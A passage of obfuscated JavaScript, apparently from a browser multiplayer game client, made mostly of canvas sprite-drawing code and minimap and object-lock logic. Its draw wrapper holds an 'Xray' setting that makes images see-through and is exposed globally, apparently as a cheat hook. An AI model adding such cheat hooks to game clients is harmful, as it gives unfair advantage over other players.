			Δ.bezierCurveTo(ᐃ * 184.57142639160156, 78.38392639160156 * ᐃ, 184.57142639160156 * ᐃ, 89.38392639160156 * ᐃ, 184.57142639160156 * ᐃ, 90.38392639160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 177.57142639160156, ᐃ * 107.38392639160156, ᐃ * 180.57142639160156, ᐃ * 112.38392639160156, ᐃ * 189.57142639160156, ᐃ * 116.38392639160156);
			Δ.bezierCurveTo(212.57142639160156 * ᐃ, ᐃ * 127.38392639160156, ᐃ * 212.57142639160156, 132.38392639160156 * ᐃ, 211.57142639160156 * ᐃ, ᐃ * 150.38392639160156);
			Δ.bezierCurveTo(ᐃ * 211.57142639160156, 227.59821128845215 * ᐃ, 211.57142639160156 * ᐃ, ᐃ * 227.59821128845215, ᐃ * 211.57142639160156, 304.81249618530273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 212.57142639160156, 328.81249618530273 * ᐃ, 209.57142639160156 * ᐃ, 330.81249618530273 * ᐃ, 188.57142639160156 * ᐃ, 333.81249618530273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 155.07142639160156, ᐃ * 333.31249618530273, 155.07142639160156 * ᐃ, ᐃ * 333.31249618530273, ᐃ * 121.57142639160156, ᐃ * 332.81249618530273);
			Δ.bezierCurveTo(ᐃ * 104.57142639160156, 327.81249618530273 * ᐃ, ᐃ * 105.57142639160156, ᐃ * 328.81249618530273, 104.57142639160156 * ᐃ, ᐃ * 312.81249618530273);
			Δ.bezierCurveTo(ᐃ * 104.57142639160156, 228.16963958740234 * ᐃ, ᐃ * 104.57142639160156, ᐃ * 228.16963958740234, 104.57142639160156 * ᐃ, ᐃ * 143.52678298950195);
			Δ.bezierCurveTo(106.57142639160156 * ᐃ, ᐃ * 124.52678298950195, 110.57142639160156 * ᐃ, 123.52678298950195 * ᐃ, 123.57142639160156 * ᐃ, ᐃ * 116.52678298950195);
			Δ.bezierCurveTo(ᐃ * 136.57142639160156, 110.52678298950195 * ᐃ, ᐃ * 130.57142639160156, ᐃ * 106.52678298950195, 126.57142639160156 * ᐃ, 98.52678298950195 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[5], ᐃ * 15);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(125.57142639160156 * ᐃ, ᐃ * 156.66963958740234);
			Δ.bezierCurveTo(ᐃ * 125.57142639160156, ᐃ * 182.66963958740234, ᐃ * 125.57142639160156, ᐃ * 182.66963958740234, 125.57142639160156 * ᐃ, ᐃ * 208.66963958740234);
			Δ.closePath();
			ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, Ⲇᐃ[ⵠⲆⵠⲆΔ], ᐃ * ⵠⲆΔⲆᐃᐃⲆ);
			return Ⲇⵠ
		}

		function ΔᐃᐃᐃΔⵠΔΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 400 * ᐃ;
			Ⲇⵠ.height = ᐃ * 400;
			Δ.translate(0, ᐃΔⲆᐃᐃΔᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⲆΔ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 102, 154 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 216.5, ᐃ * 108, ᐃ * 216.5, ᐃ * 114, 279 * ᐃ);
			Δ.bezierCurveTo(124 * ᐃ, 300 * ᐃ, ᐃ * 237, 299 * ᐃ, ᐃ * 251, ᐃ * 279);
			Δ.bezierCurveTo(257 * ᐃ, 217 * ᐃ, ᐃ * 257, 217 * ᐃ, 263 * ᐃ, 155 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 248, 194 * ᐃ, ᐃ * 91, ᐃ * 180, 103 * ᐃ, 156 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(102 * ᐃ, ᐃ * 154);
			Δ.bezierCurveTo(106 * ᐃ, ᐃ * 53, ⲆⵠⵠⵠⲆⲆⲆ * ᐃ, 53 * ᐃ, 263 * ᐃ, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 248, 38 * ᐃ, ᐃ * 99, 69 * ᐃ, 103 * ᐃ, 154 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[0], ⲆᐃΔⵠⵠΔᐃ * ᐃ);
			Δ.translate(0, -ⵠⲆⵠⵠ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 103, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98, 119 * ᐃ, 264 * ᐃ, 119 * ᐃ, ᐃ * 264, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 271, ᐃ * 189, ᐃ * 94, 188 * ᐃ, ᐃ * 103, 154 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * ᐃⲆⵠᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 102, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 108, ᐃ * 216.5, ᐃ * 108, ᐃ * 216.5, ᐃ * 114, 279 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, ᐃ * 300, ᐃ * 237, 299 * ᐃ, 251 * ᐃ, 279 * ᐃ);
			Δ.bezierCurveTo(257 * ᐃ, 217 * ᐃ, ᐃ * 257, ᐃ * 217, ᐃ * 263, ᐃ * 155);
			Δ.bezierCurveTo(248 * ᐃ, ᐃ * 194, ᐃ * 91, ᐃ * 180, ᐃ * 103, ᐃ * 156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[ᐃⲆΔⲆ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 182, ᐃ * 185);
			Δ.bezierCurveTo(182.5 * ᐃ, ᐃ * 237.5, ᐃ * 182.5, 237.5 * ᐃ, ᐃ * 183, ᐃ * 290);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[ⵠⲆⵠⲆ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 222, 287 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 226, 233.5 * ᐃ, 226 * ᐃ, ᐃ * 233.5, 230 * ᐃ, ᐃ * 180);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], ᐃ * ᐃⲆⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 145, ᐃ * 290);
			Δ.bezierCurveTo(ᐃ * 140.5, ᐃ * 237, 140.5 * ᐃ, ᐃ * 237, 136 * ᐃ, 184 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[2], ᐃ * 11);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 105, 184 * ᐃ);
			Δ.bezierCurveTo(148 * ᐃ, 205 * ᐃ, 231 * ᐃ, 202 * ᐃ, 260 * ᐃ, 182 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 259, ᐃ * 195.5, 259 * ᐃ, 195.5 * ᐃ, ᐃ * 258, ᐃ * 209);
			Δ.bezierCurveTo(ᐃ * 217, 218 * ᐃ, ᐃ * 163, 225 * ᐃ, 108 * ᐃ, ᐃ * 207);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ], Ⲇᐃ[Ⲇᐃᐃⵠ], ᐃ * ⵠΔⲆⵠⲆⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 251, ᐃ * 276);
			Δ.bezierCurveTo(ᐃ * 251.5, ᐃ * 267.5, ᐃ * 251.5, ᐃ * 267.5, ᐃ * 252, ᐃ * 259);
			Δ.bezierCurveTo(212 * ᐃ, ᐃ * 272, ᐃ * 156, 275 * ᐃ, ᐃ * 112, 260 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112.5, ᐃ * 269, ᐃ * 112.5, 269 * ᐃ, 113 * ᐃ, ᐃ * 278);
			Δ.bezierCurveTo(155 * ᐃ, 306 * ᐃ, 253 * ᐃ, 286 * ᐃ, 250 * ᐃ, 276 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ], Ⲇᐃ[Δᐃⵠⵠ], ᐃ * 11);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 102, ᐃ * 154);
			Δ.bezierCurveTo(106 * ᐃ, 53 * ᐃ, 255 * ᐃ, ᐃ * 53, ᐃ * 263, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 248, 38 * ᐃ, 99 * ᐃ, 69 * ᐃ, 103 * ᐃ, 154 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[ⵠΔⲆᐃ], ᐃ * 11);
			return Ⲇⵠ
		}

		function ΔⲆΔⲆᐃᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 465;
			Ⲇⵠ.height = ᐃ * 310;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(126 * ᐃ, ᐃ * 192);
			Δ.bezierCurveTo(198 * ᐃ, 202 * ᐃ, 245 * ᐃ, ᐃ * 203, ᐃ * 335, 194 * ᐃ);
			Δ.bezierCurveTo(336 * ᐃ, ᐃ * 232, ᐃ * 326, ᐃ * 235, ᐃ * 232, ᐃ * 237);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 235, 122 * ᐃ, ᐃ * 235, ᐃ * 126, 193 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ], Ⲇᐃ[ΔⵠΔⵠ], ᐃ * ᐃⵠⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 146, 239 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 174, 74 * ᐃ, ᐃ * 287, ᐃ * 88, 320 * ᐃ, 240 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 329, ᐃ * 231, ᐃ * 340, 219 * ᐃ, ᐃ * 332, ᐃ * 115);
			Δ.bezierCurveTo(ᐃ * 330, 40 * ᐃ, ᐃ * 144, 30 * ᐃ, 129 * ᐃ, 116 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, 217 * ᐃ, 124 * ᐃ, ᐃ * 228, 143 * ᐃ, 237 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ᐃ * ⵠΔᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(126 * ᐃ, 193 * ᐃ);
			Δ.bezierCurveTo(173 * ᐃ, ᐃ * 94, 209 * ᐃ, ᐃ * ΔΔᐃⵠᐃ, 228 * ᐃ, ᐃ * 57);
			Δ.bezierCurveTo(190 * ᐃ, 112 * ᐃ, ᐃ * 165, 115 * ᐃ, 127 * ᐃ, ᐃ * 184);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[1], ⵠᐃΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 230, 57 * ᐃ);
			Δ.bezierCurveTo(266 * ᐃ, 117 * ᐃ, ᐃ * 310, 130 * ᐃ, ᐃ * 332, 183 * ᐃ);
			Δ.bezierCurveTo(290 * ᐃ, 112 * ᐃ, 262 * ᐃ, ᐃ * 109, 230 * ᐃ, 56 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[1], ΔⲆᐃⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(154 * ᐃ, 212 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208, ᐃ * 224, 252 * ᐃ, 219 * ᐃ, ᐃ * 305, 212 * ᐃ);
			Δ.bezierCurveTo(267 * ᐃ, 219 * ᐃ, 204 * ᐃ, 222 * ᐃ, ᐃ * 155, ᐃ * 212);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 239, ᐃ * 59);
			Δ.bezierCurveTo(302 * ᐃ, 72 * ᐃ, ᐃ * 325, ᐃ * 84, ᐃ * 326, ᐃ * 115);
			Δ.bezierCurveTo(ᐃ * 289, ᐃ * 80, 270 * ᐃ, ᐃ * 88, 253 * ᐃ, ᐃ * 78);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(216 * ᐃ, ᐃ * 61);
			Δ.bezierCurveTo(209 * ᐃ, 70 * ᐃ, 209 * ᐃ, 70 * ᐃ, 202 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(173 * ᐃ, 87 * ᐃ, ᐃ * 162, 91 * ᐃ, 137 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(153 * ᐃ, 78 * ᐃ, ᐃ * 174, ᐃ * 67, ᐃ * 212, ᐃ * 62);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(175 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(218 * ᐃ, 94 * ᐃ, 238 * ᐃ, 90 * ᐃ, 281 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 245, ᐃ * 89, 240 * ᐃ, 80 * ᐃ, ᐃ * 228, 67 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 207, 100 * ᐃ, 192 * ᐃ, 104 * ᐃ, ᐃ * 177, ᐃ * 123);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			return Ⲇⵠ
		}
		ΔΔΔⲆⵠ = [];
		ⲆⲆΔᐃⲆΔᐃ = [];

		function ΔᐃΔᐃᐃⵠⵠⲆᐃ() {
			ᐃᐃΔ.ⵠᐃΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ΔᐃⵠⵠΔⲆᐃ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = 0; ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ].length > ⵠᐃ; ⵠᐃ++) {
				var ⵠᐃΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ⵠᐃΔΔⲆ, ᐃⲆⲆ);
				ⵠΔᐃΔⵠ < ⵠᐃΔᐃ && (ⵠᐃΔᐃ = ⵠΔᐃΔⵠ, ᐃᐃΔ.ⵠᐃΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = true, ᐃᐃΔ.ⵠᐃΔΔⲆ.ⲆⵠⵠΔ = ⵠᐃΔΔⲆ.ⲆⵠⵠΔ, ᐃᐃΔ.ⵠᐃΔΔⲆ.ⲆⲆΔᐃⵠ = ⵠᐃΔΔⲆ.id)
			}
			ΔᐃᐃΔ.ΔᐃⵠⵠΔⲆᐃ > ⵠᐃΔᐃ && ΔⵠⵠⲆ.ⵠᐃΔΔⲆ.ΔᐃΔⵠ(Δ)
		}

		function ᐃⲆΔΔΔⲆΔⲆⲆ() {
			ᐃᐃΔ.ⲆᐃⲆΔ.id = -ΔΔΔ;
			ᐃᐃΔ.ⲆᐃⲆΔ.lock = false;
			ᐃᐃΔ.ⲆᐃⲆΔ.locked = false;
			ᐃᐃΔ.ⲆᐃⲆΔ.ΔᐃⲆⲆⵠⲆΔ = false;
			ᐃᐃΔ.ⲆᐃⲆΔ.ⵠᐃⵠᐃⵠᐃⵠ = false;
			ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃⲆᐃⵠΔ;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ⵠⵠᐃᐃⲆᐃⲆ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = 0; ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ].length > ⵠᐃ; ⵠᐃ++) {
				var ⲆᐃⲆΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ⲆᐃⲆΔ, ᐃⲆⲆ);
				if (ⵠᐃΔᐃ > ⵠΔᐃΔⵠ) {
					ⵠᐃΔᐃ = ⵠΔᐃΔⵠ;
					ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃⲆⲆᐃΔ;
					ᐃᐃΔ.ⲆᐃⲆΔ.id = ⵠⵠΔⲆ > ⲆᐃⲆΔ.action ? -ⵠΔⲆ : Math.floor((ⲆᐃⲆΔ.action - ΔⲆᐃᐃ) / ⵠΔᐃᐃⵠ);
					ᐃᐃΔ.ⲆᐃⲆΔ.ⲆΔⲆⲆ = ⲆᐃⲆΔ.info;
					ᐃᐃΔ.ⲆᐃⲆΔ.ⲆⵠⵠΔ = ⲆᐃⲆΔ.ⲆⵠⵠΔ;
					ᐃᐃΔ.ⲆᐃⲆΔ.ⲆⲆΔᐃⵠ = ⲆᐃⲆΔ.id;
					ᐃᐃΔ.ⲆᐃⲆΔ.locked = ⲆᐃⲆΔ.lock;
					ᐃᐃΔ.ⲆᐃⲆΔ.lock = ⲆᐃⲆΔ.lock && ⲆᐃⲆΔ.ⲆⵠⵠΔ != ᐃᐃΔ.id && !ᐃᐃΔ.ⵠᐃⲆΔΔΔΔ(ⲆᐃⲆΔ.ⲆⵠⵠΔ) ? true : false;
					ᐃᐃΔ.ⲆᐃⲆΔ.ⵠᐃⵠᐃⵠᐃⵠ = ᐃᐃΔ.id === ⲆᐃⲆΔ.ⲆⵠⵠΔ && !ᐃᐃΔ.ⲆᐃⲆΔ.locked && ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔΔΔⵠᐃ) != -1 ? ⵠⵠⲆⲆΔ : ⵠᐃΔΔⵠ;
					ᐃᐃΔ.ⲆᐃⲆΔ.locked && -ⵠΔᐃ != ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔⵠΔⵠΔ) && (ᐃᐃΔ.ⲆᐃⲆΔ.ΔᐃⲆⲆⵠⲆΔ = ᐃᐃⲆᐃᐃ)
				}
			}
			if (ΔᐃᐃΔ.ⵠⵠᐃᐃⲆᐃⲆ > ⵠᐃΔᐃ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⵠΔΔᐃⲆ];
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ⵠⵠΔ[Δᐃᐃᐃ];
				var Δⵠ = Math.floor(ⲆⲆᐃᐃ.info.translate.x + (ⲆⲆᐃᐃ.info.ᐃⵠ[ᐃⵠⲆⵠ].width - ᐃⵠ.width) / 2);
				var ⲆⵠⲆ = Math.floor(ⲆⲆᐃᐃ.info.translate.y + (ⲆⲆᐃᐃ.info.ᐃⵠ[ΔΔⵠ].height - ᐃⵠ.height) / 2) + 3;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock || ᐃᐃΔ.ⲆᐃⲆΔ.ⲆⵠⵠΔ === ᐃᐃΔ.id) {
					if (ᐃᐃΔ.ⲆᐃⲆΔ.id >= 0) {
						var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ⵠⵠΔ[ᐃᐃΔ.ⲆᐃⲆΔ.id];
						ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
						var ᐃⵠⵠⵠ = ᐃᐃΔ.ⲆᐃⲆΔ.ⲆΔⲆⲆ;
						ⲆⵠⲆⲆ < ᐃⵠⵠⵠ && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
					}
				}
				if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock) {
					ᐃᐃΔ.ⲆᐃⲆΔ.ⵠᐃⵠᐃⵠᐃⵠ && ΔⵠⵠⲆ.ⵠᐃⵠΔᐃⵠⲆ.ΔᐃΔⵠ(Δ)
				} else ΔⵠⵠⲆ.ΔⲆΔᐃΔⵠᐃ.ΔᐃΔⵠ(Δ);
				ᐃᐃΔ.ⲆᐃⲆΔ.ΔᐃⲆⲆⵠⲆΔ && ΔⵠⵠⲆ.ⲆⲆⲆⵠᐃΔΔ.ΔᐃΔⵠ(Δ)
			}
		}

		function ᐃΔⲆⲆΔⲆⲆⵠⵠ() {
			if (0 < ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length) var ᐃⵠΔⲆⵠ = {
				x: ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.translate.x,
				y: ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.translate.y - 120 * ᐃ
			};
			else var ᐃⵠΔⲆⵠ = {
				x: ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.translate.x,
				y: ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.translate.y - 50 * ᐃ
			};
			Δ.globalAlpha = .8;
			var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔᐃⲆⵠΔᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⵠΔⲆⵠ.x, ᐃⵠΔⲆⵠ.y);
			Δ.globalAlpha = ᐃᐃⵠ;
			if (ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.x > -ΔᐃᐃⲆ) {
				Δ.fillStyle = ⵠ[429];
				ⵠᐃᐃ(Δ, ᐃⵠΔⲆⵠ.x + ᐃ * ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.x, ᐃⵠΔⲆⵠ.y + ᐃ * ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.y, ᐃ * 5);
				Δ.fill()
			}
			var ⲆΔⲆⲆⲆᐃⵠ = ᐃ;
			var ᐃᐃᐃⵠ = ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃᐃᐃⵠ;
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
				var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
				Δ.fillStyle = !ⲆⲆⲆ.time ? ⵠ[422] : ⵠ[422];
				ⵠᐃᐃ(Δ, ᐃⵠΔⲆⵠ.x + ᐃ * (ᐃⲆⲆ.x / (ⲆⲆⲆ.ᐃΔᐃᐃΔ * 100) * 193), ᐃⵠΔⲆⵠ.y + ᐃⲆⲆ.y / (100 * ⲆⲆⲆ.ⵠᐃⵠⲆⵠ) * 193 * ᐃ, Ⲇᐃᐃⵠ * ᐃ);
				Δ.fill()
			}
			var ᐃᐃᐃΔ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			if (ᐃᐃᐃΔ) {
				Δ.fillStyle = !ⲆⲆⲆ.time ? "#e39716" : ⵠ[433];
				ⵠᐃᐃ(Δ, ᐃⵠΔⲆⵠ.x + ᐃ * (ᐃᐃᐃΔ.x / (ⲆⲆⲆ.ᐃΔᐃᐃΔ * ᐃⵠΔᐃᐃ) * 193), ᐃⵠΔⲆⵠ.y + ᐃᐃᐃΔ.y / (ⲆⲆⲆ.ⵠᐃⵠⲆⵠ * ΔΔᐃⵠᐃ) * 193 * ᐃ, ⵠΔᐃΔ * ᐃ);
				Δ.fill()
			}
			ᐃ = ⲆΔⲆⲆⲆᐃⵠ
		}

		function ΔⲆΔⵠ(Δ, ᐃⵠ, ⲆᐃΔⲆ, ⲆΔᐃⲆ, Δⵠⵠᐃ, ⵠΔⵠⵠ, ᐃΔᐃ, ⵠΔⲆΔᐃᐃⵠ, ⵠⵠᐃ, ⵠᐃ) {
			if (undefined === ᐃⵠ.ΔⲆᐃΔΔᐃΔ || 1 === ᐃⵠ.ΔⲆᐃΔΔᐃΔ()) {
				if (Settings.Xray.enabled) arguments[0].globalAlpha = Settings.XrayOpacity;
				if (undefined !== ⵠᐃ) Δ.drawImage(ᐃⵠ, ⲆᐃΔⲆ, ⲆΔᐃⲆ, Math.max(ⵠᐃⵠΔ, Δⵠⵠᐃ), Math.max(1, ⵠΔⵠⵠ), ᐃΔᐃ, ⵠΔⲆΔᐃᐃⵠ, ⵠⵠᐃ, ⵠᐃ);
				else if (ᐃⲆᐃⲆⲆ !== ⵠΔⵠⵠ) Δ.drawImage(ᐃⵠ, ⲆᐃΔⲆ, ⲆΔᐃⲆ, Δⵠⵠᐃ, ⵠΔⵠⵠ);
				else Δ.drawImage(ᐃⵠ, ⲆᐃΔⲆ, ⲆΔᐃⲆ)
			}
		}
		window.ctxDrawImage = ΔⲆΔⵠ;

		function ⲆΔⵠⲆΔΔⵠⵠᐃ() {
			var ⲆᐃΔⵠᐃ = ΔⵠⵠⲆ.Δᐃᐃᐃᐃ;
			var ⲆⵠⲆⵠ = ⲆᐃΔⵠᐃ.id;
			if (ᐃᐃⲆΔ === ⲆᐃΔⵠᐃ.ⵠᐃΔΔΔ && 1 === ⲆᐃΔⵠᐃ.display) {
				if (ⲆⲆⲆⲆᐃ === ΔΔΔⲆⵠ[ⲆⵠⲆⵠ]) ΔΔΔⲆⵠ[ⲆⵠⲆⵠ] = ⲆΔⵠⵠᐃⲆΔᐃᐃ(ⲆⵠⲆⵠ);
				if (ⲆᐃΔⵠᐃ.ⵠΔΔⲆ === ⵠΔᐃ) ΔⲆΔⵠ(Δ, ΔΔΔⲆⵠ[ⲆⵠⲆⵠ], ⲆᐃΔⵠᐃ.x, ⲆᐃΔⵠᐃ.y);
				else {
					if (ΔΔΔᐃ < ⲆᐃΔⵠᐃ.x - 80 + ΔΔΔⲆⵠ[ⲆⵠⲆⵠ].width) ΔⲆΔⵠ(Δ, ΔΔΔⲆⵠ[ⲆⵠⲆⵠ], ΔΔΔᐃ - ΔΔΔⲆⵠ[ⲆⵠⲆⵠ].width - 10, ⲆᐃΔⵠᐃ.y - ΔΔΔⲆⵠ[ⲆⵠⲆⵠ].height - 10);
					else ΔⲆΔⵠ(Δ, ΔΔΔⲆⵠ[ⲆⵠⲆⵠ], ⲆᐃΔⵠᐃ.x - 80, ⲆᐃΔⵠᐃ.y - ΔΔΔⲆⵠ[ⲆⵠⲆⵠ].height - 10)
				}
			}
		}

		function ΔᐃᐃⲆⲆⵠⵠ() {
			ᐃᐃΔ.ⵠΔΔᐃⵠ.id = -1;
			ᐃᐃΔ.ⵠΔΔᐃⵠ.ⲆⵠⵠΔ = -ⵠΔΔ;
